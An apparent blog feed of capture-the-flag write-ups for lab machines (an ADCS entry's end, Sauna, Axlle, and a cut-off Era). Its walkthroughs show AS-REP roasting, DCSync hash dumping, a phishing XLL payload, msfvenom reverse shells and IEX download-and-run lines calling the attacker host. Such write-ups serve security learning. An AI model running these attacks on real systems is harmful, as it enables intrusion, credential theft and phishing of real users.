$ proxychains4 -q certipy req -dc-ip 10.10.149.117 -u &#x27;MAIL01$@hybrid.vl&#x27; -hashes :&lt;SNIP&gt; -ca hybrid-DC01-CA -template HybridComputers -upn Administrator -key-size 4096 -debugCertipy v4.8.2 - by Oliver Lyak (ly4k)[+] Generating RSA key[*] Requesting certificate via RPC[+] Trying to connect to endpoint: ncacn_np:10.10.149.117[\pipe\cert]                          [+] Connected to endpoint: ncacn_np:10.10.149.117[\pipe\cert][*] Successfully requested certificate                                                         [*] Request ID is 21[*] Got certificate with UPN &#x27;Administrator&#x27;[*] Certificate has no object SID                                                              [*] Saved certificate and private key to &#x27;administrator.pfx&#x27;
Lastly, we authenticate with the pfx file. 
$ proxychains4 -q certipy auth -pfx administrator.pfx -domain hybrid.vl -dc-ip 10.10.149.117 -debugCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: administrator@hybrid.vl[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;administrator.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;administrator&#x27;[*] Got hash for &#x27;administrator@hybrid.vl&#x27;: &lt;SNIP&gt;


]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>ADCS</tag>
        <tag>NFS</tag>
        <tag>Roundcube Webmail</tag>
      </tags>
  </entry>
  <entry>
    <title>Sauna (Windows Easy)</title>
    <url>/2025/05/10/Sauna/</url>
    <content><![CDATA[
This box start off with port 80 open. Enumeration of the website returns users upon a page. Kerberoasting proves successful as you retrieve the hash of user fsmith. Once the hash is cracked we are able to gain access to the machine. Doing the steps to escalate privilege we come across cached credentials used by WinLogon found in Registry for user svc_loanmanager, we get the credentials using PowerShell. After looking at the user in Bloodhound, we find the user has GetChangesAll to the domain. This allows the user to DCSync and dump all the hashes for the domain.
Initial NmapPORT     STATE SERVICE       REASON          VERSION                                   53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus                           80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0                  |_http-title: Egotistical Bank :: Home                                                | http-methods:                                                                       |   Supported Methods: OPTIONS TRACE GET HEAD POST                                     |_  Potentially risky methods: TRACE                                                  |_http-server-header: Microsoft-IIS/10.0                                              88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-10 21:23:01Z)135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                     139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn             389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds? syn-ack ttl 127                                          464/tcp  open  kpasswd5?     syn-ack ttl 127                                          593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0       636/tcp  open  tcpwrapped    syn-ack ttl 127                                          3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)3269/tcp open  tcpwrapped    syn-ack ttl 127                                          Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
From the looks of the scan, we dealing with Active Directory. ðŸ˜ðŸ˜Ž
Port 80 is open as well, maybe ADCS. Lets see.
HTTP - EgotisticalBankingâ€¦funnySo we look through the website and much of it is ending in .html, so not very useful. Yet there is a about us section, which has some people on it and their names. We can gather these and try them.
$ curl -s http://10.10.10.175/about.html | html2text | grep -i Fergus -A5 &gt; users.lst
Now we need to spice it up a bit, we can create a list of potential usernames with username-anarchy.
$ username-anarchy -i users.lst &gt; users.list

Kerberoasting the lot of â€˜emWe can see if any usernames are valid.
$ kerbrute userenum -d egotistical-bank.local --dc 10.10.10.175 users.list&lt;SNIP&gt;2025/05/10 12:05:48 &gt;  Using KDC(s):2025/05/10 12:05:48 &gt;   10.10.10.175:882025/05/10 12:05:48 &gt;  [+] VALID USERNAME:       fsmith@egotistical-bank.local
Lets see if fsmith has Do not require Kerberos preauthentication set, might get an easy win.
$ GetNPUsers.py -dc-ip 10.10.10.175 &#x27;egotistical-bank.local/fsmith&#x27; -outputfile ./fsmith.hashName    MemberOfPasswordLastSet             LastLogon                   UAC      ------  ------------------------------------------------------------------  --------------------------  --------------------------  --------FSmith  CN=Remote Management Users,CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL  2020-01-23 10:45:19.047096  2025-05-10 19:10:08.254342  0x410200 $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:&lt;SNIP&gt;

This does get us user fsmithâ€˜s hash. We can crack it with hashcat and get a cleartext password (-m 18200). After that we run a bloodhound dump and see what privileges our user has on the box. 
--HashCat--$ hashcat -a 0 -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt--BloodHound--$ nxc ldap egotistical-bank.local -u fsmith -p &lt;SNIP&gt; --bloodhound -c All --dns-server 10.10.10.175
BloodHound the big Angry DogLooking at our user fsmith, we donâ€™t have anything useful to escalate our privilege, but we are apart of the Remote Management Users group. That being a start we can make our way onto the box.
Weâ€™ll come back when we have more!!

Evil things are happeningOnce on the box, we do some basic enumeration (i.e. net tools, uncommon installed programs, checking registry, and services). We happen to find a AutoLogon assigned to user svc_loanmanager.
*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; Get-ItemProperty -Path &#x27;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\&#x27; -Name &quot;DefaultUserName&quot;DefaultUserName : EGOTISTICALBANK\svc_loanmanagerPSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersionPSChildName     : WinlogonPSDrive         : HKLMPSProvider      : Microsoft.PowerShell.Core\Registry
We can actually obtain the password using the same command just specify DefaultPassword for the Name parameter.
Evil-WinRM* PS C:\Users\Administrator\Documents&gt; Get-ItemProperty -Path &#x27;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\&#x27; -Name &quot;DefaultPassword&quot;DefaultPassword : &lt;SNIP&gt;PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersionPSChildName     : WinlogonPSDrive         : HKLMPSProvider      : Microsoft.PowerShell.Core\Registry

Back to the Future at least to BloodHoundLooking for this user in bloodhound, we donâ€™t find svc_loanmanager, yet we do see svc_loanmgr. We see his privileges are much more dangerous. He has GetChangesAll allowing for our user to DCSync with the domain and dump hashes.

Dumping everythingFinally, with secretsdump we collect the Administrator hash.
secretsdump.py -dc-ip 10.10.10.175 &#x27;egotistical-bank.local/svc_loanmgr@egotistical-bank.local&#x27;&lt;SNIP&gt;[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                 [*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;:::EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;:::&lt;SNIP&gt;


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>ASREPRoasting</tag>
        <tag>PowerShell</tag>
        <tag>AutoLogon</tag>
      </tags>
  </entry>
  <entry>
    <title>Axlle (Windows Hard)</title>
    <url>/2025/06/24/Axlle/</url>
    <content><![CDATA[
Axlle is a hard-level Windows machine that begins with a website running on port 80. The site displays a maintenance message but mentions that Excel invoices can still be sent via email for processing.
An attacker exploits this by crafting a malicious .XLL file, which bypasses security checks and is used in a phishing attack. Once the attacker gains code execution on the machine, they create a malicious .url file. This file is executed by the user dallon.matrix, leading to the compromise of their account.
The dallon.matrix user is part of a group that has the ability to change the password of another user, jacob.greeny. The attacker leverages this privilege to reset the password and authenticate as jacob.greeny via WinRM.
The jacob.greeny user is a member of the App Devs group, which has access to a scheduled automation that runs the StandaloneRunner binary with SYSTEM privileges. The attacker exploits this automated task to escalate privileges and ultimately gain a shell as the Administrator.
Intial NmapPORT      STATE SERVICE       REASON          VERSION25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-favicon: Unknown favicon MD5: FAF2C069F86E802FD21BF15DC8EDD2DC| http-methods:|   Supported Methods: OPTIONS TRACE GET HEAD POST|_  Potentially risky methods: TRACE|_http-title: Axlle Development88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-24 20:33:49Z)135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds? syn-ack ttl 127464/tcp   open  kpasswd5?     syn-ack ttl 127593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped    syn-ack ttl 1273268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped    syn-ack ttl 1275985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC64934/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC64936/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.064937/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC64944/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC64948/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC64956/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

From our scan we see of the bat port 25/smtp running and we have port 80/http open as well. We can check that out first.
Http for meLooking over the site it seems pretty static. Yet the about seems interesting.

Maybe we send a invoiceâ€¦.or 2 ðŸ¤£
Excelling at everythingIf we have any outstanding invoices we can send them their way in a Excel. Looking more into macros for Excel we come across Excel Add-In. This article explains it a bit more in depth, but essentially we can create a xll file, really just a dll and send it as an attachment in a email. This should get us code execution and a foothold on the box.
We can create a simple payload and see if we get a callback, weâ€™ll start with ping:
// ping.c#include &lt;windows.h&gt;__declspec(dllexport) short __stdcall xlAutoOpen() &#123;    WinExec(&quot;cmd /c ping -n 1 10.10.14.7&quot;, SW_HIDE); // Replace with payload    return 1;&#125;
Note: We can compile using Visual Studio (cl.exe) but this is far easier, if we ran into problems then I would pivot to that. Using just the __declspec(dllexport) short __stdcall xlAutoOpen() will export the correct function we need to use for a Excel Add-In. 
Then we can compile with x86_64-w64-mingw32-gcc:
konoha# x86_64-w64-mingw32-gcc ping.c -shared -o ping.xll -s -Os -DUNICODE

We can now setup a little test using tcpdump and using the open 25/smtp port we can send a little email using swaks:
konoha# swaks --to accounts@axlle.htb --from jay@axlle.htb --header &quot;Subject: Invoice\!&quot; --body &quot;Take My Money\!&quot; --attach @ping.xll=== Trying axlle.htb:25...=== Connected to axlle.htb.&lt;-  220 MAINFRAME ESMTP -&gt; EHLO konoha&lt;-  250-MAINFRAME&lt;-  250-SIZE 20480000&lt;-  250-AUTH LOGIN&lt;-  250 HELP -&gt; MAIL FROM:&lt;jay@axlle.htb&gt;&lt;-  250 OK -&gt; RCPT TO:&lt;accounts@axlle.htb&gt;&lt;-  250 OK -&gt; DATA&lt;-  354 OK, send. -&gt; Date: Tue, 24 Jun 2025 15:59:35 -0500 -&gt; To: accounts@axlle.htb -&gt; From: jay@axlle.htb -&gt; Subject: Invoice overdue! -&gt; Message-Id: &lt;20250624155935.961242@konoha&gt; -&gt; X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/ -&gt; MIME-Version: 1.0 -&gt; Content-Type: multipart/mixed; boundary=&quot;----=_MIME_BOUNDARY_000_961242&quot; -&gt; -&gt; ------=_MIME_BOUNDARY_000_961242 -&gt; Content-Type: text/plain -&gt; -&gt; Please pay the attached invioce ASAP. It is past due. -&gt; ------=_MIME_BOUNDARY_000_961242 -&gt; Content-Type: application/octet-stream; name=&quot;ping.xll&quot; -&gt; Content-Description: ping.xll -&gt; Content-Disposition: attachment; filename=&quot;ping.xll&quot; -&gt; Content-Transfer-Encoding: BASE64 -&gt; -&gt; TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -&gt; AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v -&gt; ZGUuDQ0KJAAAAAAAAABQRQAAZIYKAJUQW2gAAAAAAAAAAPAALiILAgIsABQAAAAWAAAAAgAAMBMA -&gt; AAAQAAAAAGRHAwAAAAAQAAAAAgAABAAAAAAAAAAFAAIAAAAAAADAAAAABAAAGJAAAAMAYAEAACAA&lt;SNIP&gt; -&gt; QUIT&lt;-  221 goodbye=== Connection closed with remote host.

Waiting a minute or two and we get a callback.
konoha# tcpdump -i tun0 icmptcpdump: verbose output suppressed, use -v[v]... for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes15:59:47.987219 IP MAINFRAME.axlle.htb &gt; 10.10.14.7: ICMP echo request, id 1, seq 2, length 4015:59:47.987303 IP 10.10.14.7 &gt; MAINFRAME.axlle.htb: ICMP echo reply, id 1, seq 2, length 40

Phishing for entry
We can now replace our payload with a powershell(b64) reverse shell and get our shell now. Then after a minute or two.
konoha# rlwrap -cAr nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.7] from (UNKNOWN) [10.10.11.21] 65335PS C:\&gt; whoamiaxlle\gideon.hamill

Further enumeration requiredNow that weâ€™re on the box, we can look around, but first I will get SharpHound.exe on the box and then fire up BloodHoundCE.
PS C:\&gt; cd C:\\ProgramData ; iwr http://10.10.14.7/SharpHound.exe -o SH.exePS C:\ProgramData&gt; .\SH.exe -c All
It may look like itâ€™s not doing anything, give it time to finishâ€¦youâ€™ll see output.
After it completes we can transfer it over and browse.
Bloodhound shows us nothing at the moment for our user. We can enumerate manually on the machine with PowerView.ps1and doing this shows that Web Devs have special permissions over 2 users.
ObjectDN                : CN=Jacob Greeny,DC=axlle,DC=htbAceQualifier            : AccessAllowedActiveDirectoryRights   : ExtendedRightObjectAceType           : User-Force-Change-PasswordAceFlags                : ContainerInheritAceType                 : AccessAllowedObjectInheritanceFlags        : ContainerInheritSecurityIdentifier      : S-1-5-21-1005535646-190407494-3473065389-1127IdentityReferenceName   : Web DevsIdentityReferenceDomain : axlle.htbIdentityReferenceDN     : CN=Web Devs,CN=Users,DC=axlle,DC=htbIdentityReferenceClass  : groupObjectDN                : CN=Baz Humphries,DC=axlle,DC=htbAceQualifier            : AccessAllowedActiveDirectoryRights   : ExtendedRightObjectAceType           : User-Force-Change-PasswordAceFlags                : NoneAceType                 : AccessAllowedObjectInheritanceFlags        : NoneSecurityIdentifier      : S-1-5-21-1005535646-190407494-3473065389-1127IdentityReferenceName   : Web DevsIdentityReferenceDomain : axlle.htbIdentityReferenceDN     : CN=Web Devs,CN=Users,DC=axlle,DC=htb
So how do we get ourselves into that group???ðŸ¤”ðŸ¤”
I smell MailWe know that the machine is running a mail server so we can check the obvious places for installed programs and alas we find hMailServer in the x86 directory. In that directory lies more data for us.
PS C:\Program Files (x86)\hMailServer\Data\axlle.htb&gt; ls    Directory: C:\Program Files (x86)\hMailServer\Data\axlle.htbMode                 LastWriteTime         Length Name----                 -------------         ------ ----d-----         6/24/2025   2:07 PM                accountsd-----         6/24/2025   2:07 PM                Attachmentsd-----          1/1/2024   6:32 AM                dallon.matrixd-----         6/24/2025   2:07 PM                ReviewedAttachments
And if we look in to dallonâ€™s directory we see an email.
PS C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F&gt; ls    Directory: C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2FMode                 LastWriteTime         Length Name----                 -------------         ------ -----a----          1/1/2024   6:32 AM            997 &#123;2F7523BD-628F-4359-913E-A873FCC59D0F&#125;.eml
This email states the following:
Hi everyone,The Web Dev group is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.We ask that you drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation.Yours in click-worthy URLs,The Web Dev Team

So the C:\inetpub\testing directory is being monitored for web shortcuts. We can perhaps make a malicious shortcut, like with lnk files. Lets create a payload with msfvenom and then place it on the box, then create a web shortcut point to it.
konoha# msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9002 -f exe &gt; s.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 460 bytesFinal size of exe file: 7168 bytes
Transfer to the box and set up our shortcut.
# web shortcut[internetshortcut]C:\\ProgramData\s.exe
We can then upload it and wait for our callback.
konoha# rlwrap -cAr nc -lvnp 9002listening on [any] 9002 ...connect to [10.10.14.7] from (UNKNOWN) [10.10.11.21] 53229Microsoft Windows [Version 10.0.20348.2527](c) Microsoft Corporation. All rights reserved.C:\&gt;whoamiwhoamiaxlle\dallon.matrix

Abuse the bullyNow we know weâ€™re apart of the Web Devs group fom the ACLs output. We can simply change the password for jacob.greeny using PowerView.ps1.
C:\&gt;powershell -ep bypasspowershell -ep bypassWindows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindowsPS C:\&gt; IEX((New-Object System.Net.WebClient).DownloadString(&#x27;http://10.10.14.7/PowerView.ps1&#x27;))IEX((New-Object System.Net.WebClient).DownloadString(&#x27;http://10.10.14.7/PowerView.ps1&#x27;))PS C:\&gt; $cred = ConvertTo-SecureString &#x27;Welcome123!&#x27; -AsPlainText -Force$cred = ConvertTo-SecureString &#x27;Welcome123!&#x27; -AsPlainText -ForcePS C:\&gt; Set-DomainUserPassword -Identity jacob.greeny -AccountPassword $cred -VerboseSet-DomainUserPassword -Identity jacob.greeny -AccountPassword $cred -VerboseVERBOSE: [Set-DomainUserPassword] Attempting to set the password for user &#x27;jacob.greeny&#x27;VERBOSE: [Set-DomainUserPassword] Password for user &#x27;jacob.greeny&#x27; successfully reset

Pure EvilJacob gets us a WinRM session on the box. Looking at bloodhound we weâ€™re part of the App Devs group. 

Looking back at the root we did have a directory we couldnâ€™t access called App Development. This directory has a README.md stating that the aim of this application is to allow users to program and simulate custom keyboard layouts. Devs must be building something for their clients or vendors.
*Evil-WinRM* PS C:\App Development\kbfiltr&gt; ls    Directory: C:\App Development\kbfiltrMode                 LastWriteTime         Length Name----                 -------------         ------ ----d-----          1/1/2024  10:03 PM                exed-----          1/1/2024  10:03 PM                sys-a----        12/14/2023  11:39 AM           2528 kbfiltr.sln-a----         6/11/2024  11:16 PM           2805 README.md

**NOTE: I have automated the running of &#39;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe&#39; as SYSTEM to test and debug this driver in a standalone environment**
It states that standalonerunner.exe is running as SYSTEM to test and debug the driver. If we look up more on the exe we find an article stating that we can gain arbitrary command execution by making a couple of files and a command.txt that will be our binary to execute. 
Privilege for the StrongAfter reading the github on this vulnerablility I came up with a little one liner, as Iâ€™m sure most did. First we must go to the directory where the exe and dll reside. We can use the same reverse shell we created with msfvenom for our command.txt.
*Evil-WinRM* PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64&gt; ls    Directory: C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64Mode                 LastWriteTime         Length Name----                 -------------         ------ -----a----         9/30/2023   3:08 AM          33392 standalonerunner.exe-a----         9/30/2023   3:08 AM          43632 standalonexml.dll*Evil-WinRM* PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64&gt; echo &quot;myTestDir`nTrue&quot; &gt; reboot.rsf ; mkdir -p myTestDir\working ; echo &quot; &quot; &gt; myTestDir\working\rsf.rsf ; echo &quot;C:\\ProgramData\s.exe&quot; &gt; command.txt    Directory: C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\myTestDirMode                 LastWriteTime         Length Name----                 -------------         ------ ----d-----         6/24/2025   3:03 PM                working*Evil-WinRM* PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64&gt; &quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe&quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe
After a couple of minutes we recieve a shell back.
konoha# rlwrap -cAr nc -lvnp 9002listening on [any] 9002 ...connect to [10.10.14.7] from (UNKNOWN) [10.10.11.21] 52931Microsoft Windows [Version 10.0.20348.2527](c) Microsoft Corporation. All rights reserved.C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\myTestDir\working&gt;whoamiwhoamiaxlle\administrator


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>xll</tag>
        <tag>phishing</tag>
        <tag>shortcuts</tag>
        <tag>DACL Abuse</tag>
        <tag>LOLBIN</tag>
      </tags>
  </entry>
  <entry>
    <title>Era (Linux Hard)</title>
    <url>/2025/07/27/Era/</url>
    <content><![CDATA[
This is a linux hard box focusing on SSRF which you can use in turn to trigger ssh2.exec. This executes on the box giving a reverse shell. On the box we escalate to eric with previously cracked hash. Using pspy, we find a binary running via cronjob. The binary objcopy is used to check a file, with in turn we replace with our malicious binary that upon execution gets us a shell as root. 
Initial NmapPORT   STATE SERVICE REASON         VERSION21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.580/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://era.htb/Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

FTP for smilesLooking at FTP and trying anonymous logon get us nothing. Moving on.
HTTPScanning this site gives us the domain name era.htb we can add to our hosts file. Looking at the site nothing special.

We can scan for subdomains, which we get a hit on file.
konoha# ffuf -u http://era.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &#x27;Host: FUZZ.era.htb&#x27; -fl 8&lt;        /&#x27;___\  /&#x27;___\           /&#x27;___\       /\ \__/ /\ \__/  __  __  /\ \__/       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         \ \_\   \ \_\  \ \____/  \ \_\          \/_/    \/_/   \/___/    \/_/       v2.1.0-dev________________________________________________ :: Method           : GET :: URL              : http://era.htb :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header           : Host: FUZZ.era.htb :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500 :: Filter           : Response lines: 8________________________________________________&gt;file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 42ms]

After adding it to our hosts file we can visit.

From the looks its a storage management page were we can upload files. If we try register.php we get a page we can sign up.

Once done we get redirected to a login page, looking around we see a upload files tab. Lets try this.

Once we upload our file we get a link returned.

We should try fuzzing this as it reeks of IDOR(Insecure Direct Object Reference). We can send this to burpsuite, and try numbers from 1 to our id number (4672). We add the position, start the attack and look at our lengths. We can see off the bat, id number 54 has a different length. Looking at this reveals the site backup, which we download. 

Source Code for Downloading - AdminLooking into this zip file we see the download.php we just used. We can look at the source code to see how this works. Upon looking at it, we find this bit that works only for admins.
// BETA (Currently only available to the admin) - Showcase file instead of downloading it&#125; elseif ($_GET[&#x27;show&#x27;] === &quot;true&quot; &amp;&amp; $_SESSION[&#x27;erauser&#x27;] === 1) &#123;   		$format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] : &#x27;&#x27;;   		$file = $fetched[0];	if (strpos($format, &#x27;://&#x27;) !== false) &#123;       		$wrapper = $format;       		header(&#x27;Content-Type: application/octet-stream&#x27;);   		&#125; else &#123;       		$wrapper = &#x27;&#x27;;       		header(&#x27;Content-Type: text/html&#x27;);   		&#125;   		try &#123;       		$file_content = fopen($wrapper ? $wrapper . $file : $file, &#x27;r&#x27;);		$full_path = $wrapper ? $wrapper . $file : $file;		// Debug Output		echo &quot;Opening: &quot; . $full_path . &quot;\n&quot;;       		echo $file_content;   		&#125; catch (Exception $e) &#123;       		echo &quot;Error reading file: &quot; . $e-&gt;getMessage();   		&#125;

We also have a sqlite database, which we can dump.
konoha# sqlite3 filedb.sqlite &#x27;.dump&#x27;PRAGMA foreign_keys=OFF;BEGIN TRANSACTION;CREATE TABLE files (		fileid int NOT NULL PRIMARY KEY,		filepath varchar(255) NOT NULL,		fileowner int NOT NULL,		filedate timestamp NOT NULL		);INSERT INTO files VALUES(54,&#x27;files/site-backup-30-08-24.zip&#x27;,1,1725044282);CREATE TABLE users (		user_id INTEGER PRIMARY KEY AUTOINCREMENT,		user_name varchar(255) NOT NULL,		user_password varchar(255) NOT NULL,		auto_delete_files_after int NOT NULL		, security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255));INSERT INTO users VALUES(1,&#x27;admin_ef01cab31aa&#x27;,&#x27;$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC&#x27;,600,&#x27;Maria&#x27;,&#x27;Oliver&#x27;,&#x27;Ottawa&#x27;);INSERT INTO users VALUES(2,&#x27;eric&#x27;,&#x27;$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm&#x27;,-1,NULL,NULL,NULL);INSERT INTO users VALUES(3,&#x27;veronica&#x27;,&#x27;$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK&#x27;,-1,NULL,NULL,NULL);INSERT INTO users VALUES(4,&#x27;yuri&#x27;,&#x27;$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.&#x27;,-1,NULL,NULL,NULL);INSERT INTO users VALUES(5,&#x27;john&#x27;,&#x27;$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6&#x27;,-1,NULL,NULL,NULL);INSERT INTO users VALUES(6,&#x27;ethan&#x27;,&#x27;$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC&#x27;,-1,NULL,NULL,NULL);DELETE FROM sqlite_sequence;INSERT INTO sqlite_sequence VALUES(&#x27;users&#x27;,16);COMMIT;

Putting these into a file and attempting to crack with john the ripper.
konoha# john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt hashesUsing default input encoding: UTF-8Loaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096Will run 8 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusmustang          (yuri)america          (eric)2g 0:00:00:23 0.02% (ETA: 2025-07-29 00:21) 0.08340g/s 54.04p/s 246.2c/s 246.2C/s moose..blahblahUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession aborted

Security QuestionsWe saw a update security questions tab, since we have usernames lets try to reset the admin password.
After doing so we get this response.
Lets try to sign in as the admin now. Instead of using a password we can use the security questions we just updated.
After filling these in, we can login. Once the verify and login button is pressed we are redirected to our file storage dashboard.
Once there we see the signing and site backup zip files. We knew about the site backup. We have the source code which if we rememeber we have a little piece we can try now that weâ€™re admin.
Exploiting the flaw in a new Era ðŸ˜ƒðŸ¤£So for this we are going to use the show parameter and the format parameter we saw from the download.php. Looking at the code if :// is used it will treat whatever is passed as a wrapper. We can try to get a reverse shell using the ssh2 library. Cool trick if I might add, first we have the password for yuri and eric we can try either, Iâ€™ll use yuri. 
First we can copy the link and then go to it in our web browser, meanwhile intercepting with burpsuite. Then send it to repeater and add this to the request.
